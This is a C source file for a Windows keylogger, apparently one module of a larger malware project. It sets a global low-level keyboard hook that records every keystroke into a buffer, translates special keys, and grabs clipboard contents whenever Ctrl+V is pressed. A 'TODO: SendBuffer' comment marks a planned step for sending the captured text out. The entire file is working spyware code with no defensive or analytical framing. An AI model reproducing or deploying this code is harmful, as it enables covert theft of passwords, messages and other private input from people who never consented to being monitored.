#include "Keylogger.h"
#include "..\Debugger.h"
#include "..\Constants.h"

#include <tchar.h> // _tcscat_s, _tprintf, _stprintf_s _tcslen, _taccess
#include <stdio.h>
#include <io.h>   

static HHOOK ghHook = { 0 }; // Handle to keyboard hook

CONST PTCHAR GetVirtualKeyName(DWORD vkCode)
{
	switch (vkCode)
	{
	case VK_BACK:
		return TEXT("[BACKSPACE]");

	case VK_TAB:
		return TEXT("[TAB]");

	case VK_RETURN:
		return TEXT("[ENTER]");

	case VK_LSHIFT:
	case VK_RSHIFT:
		return TEXT("[SHIFT]");

	case VK_MENU:
		return TEXT("[ALT]");

	case VK_CAPITAL:
		return TEXT("[CAPSLOCK]");

	case VK_ESCAPE:
		return TEXT("[ESCAPE]");

	case VK_PRIOR:
		return TEXT("[PAGEUP]"); 

	case VK_NEXT:
		return TEXT("[PAGEDOWN]");
	
	case VK_END:
		return TEXT("[END]"); 
	
	case VK_HOME:
		return TEXT("[HOME]");

	case VK_LEFT:
		return TEXT("[LEFT]");

	case VK_UP:
		return TEXT("[UP]");

	case VK_RIGHT:
		return TEXT("[RIGHT]");

	case VK_DOWN:
		return TEXT("[DOWN]");

	case VK_SNAPSHOT:
		return TEXT("[PRINTSCR]");

	case VK_INSERT:
		return TEXT("[INSERT]");

	case VK_DELETE:
		return TEXT("[DELETE]");

	// TODO: NUMPAD and FXX keys

	case VK_NUMLOCK:
		return TEXT("[NUMLOCK]");

	case VK_SCROLL:
		return TEXT("[SCROLLLOCK]");

	default:
		return NULL;
	}
}

CONST PTCHAR GetClipboardBuffer()
{
	if (!OpenClipboard(NULL))
	{
		PrintError(TEXT("OpenClipboard"), GetLastError());

		return NULL;
	}

	HANDLE hHandle = GetClipboardData(CF_TEXT);
	if (!hHandle)
	{
		PrintError(TEXT("GetClipboardData"), GetLastError());

		return NULL;
	}

	CONST PTCHAR data = GlobalLock(hHandle);
	if (!data)
	{
		PrintError(TEXT("GlobalLock"), GetLastError());

		return NULL;
	}

	if (!GlobalUnlock(hHandle))
	{
		PrintError(TEXT("GlobalUnlock"), GetLastError());
		if (!CloseClipboard())
			PrintError(TEXT("CloseClipboard"), GetLastError());

		return data;
	}

	if (!CloseClipboard())
	{
		PrintError(TEXT("CloseClipboard"), GetLastError());

		return data;
	}

	return data;
}

BOOL LogKey(CONST PKBDLLHOOKSTRUCT kbdhs) //-V2009
{
	if (kbdhs->vkCode == VK_CONTROL || kbdhs->vkCode  == VK_LCONTROL || kbdhs->vkCode  == VK_RCONTROL)
		return TRUE;

	static TCHAR buffer[KEYLOGGER_BUFFER_LENGTH] = { 0 };

	CONST PTCHAR vkName = GetVirtualKeyName(kbdhs->vkCode);
	if (vkName != NULL)
	{
		errno_t code = _tcscat_s(buffer, KEYLOGGER_BUFFER_LENGTH, vkName);
		if (code != 0)
		{
			$error _tprintf(TEXT("Cannot construct buffer, error: %d"), code);

			return FALSE;
		}
	}
	else if (GetKeyState(VK_CONTROL) >> 15)
	{
		TCHAR ctrl[] = TEXT("[CTRL + %c]");
		if (_stprintf_s(ctrl, ARRAYSIZE(ctrl), ctrl, (TCHAR)kbdhs->vkCode) == -1) //-V549
		{
			$error _tprintf(TEXT("_stprintf_s failed\n"));

			return FALSE;
		}
		
		errno_t code = _tcscat_s(buffer, KEYLOGGER_BUFFER_LENGTH, ctrl);
		if (code != 0)
		{
			$error _tprintf(TEXT("Cannot construct buffer, error: %d\n"), code);

			return FALSE;
		}

		if (kbdhs->vkCode == 0x56) // 'V'
		{
			CONST PTCHAR clipboard = GetClipboardBuffer();
			if (!clipboard)
				return FALSE;

			code = _tcscat_s(buffer, KEYLOGGER_BUFFER_LENGTH, clipboard);
			if (code != 0)
			{
				$error _tprintf(TEXT("Cannot add clipboard data to buffer, error: %d\n"), code);

				return FALSE;
			}
		}
	}
	else 
	{
		BYTE state[KEYBOARD_STATE_SIZE] = { 0 };
		GetKeyboardState(state);

		WORD key = 0;
		if (!ToAscii(kbdhs->vkCode, kbdhs->scanCode, state, &key, 0u))
		{
			_tprintf(TEXT("ToAscii failed to translate\n"));

			return FALSE;
		}

		buffer[_tcslen(buffer)] = (TCHAR)key;
	}
	$i  _tprintf(TEXT("Buffer:%s\n"), buffer);

	if (_tcslen(buffer) >= KEYLOGGER_BUFFER_LENGTH - 10)
	{
		// TODO: SendBuffer

		memset(buffer, 0, sizeof(buffer));
	}

	return TRUE;
}

LRESULT WINAPI KeyboardHook(INT code, WPARAM wParam, LPARAM lParam)
{
	if (code == HC_ACTION && wParam == WM_KEYDOWN)
		LogKey((PKBDLLHOOKSTRUCT)lParam);

	return CallNextHookEx(ghHook, code, wParam, lParam);
}

BOOL SetKeyboardHook()
{
	ghHook = SetWindowsHookEx(WH_KEYBOARD_LL, KeyboardHook, NULL, 0ul);
	if (!ghHook)
	{
		PrintError(TEXT("SetWindowsHookEx"), GetLastError());

		return FALSE;
	}

	return TRUE;
}

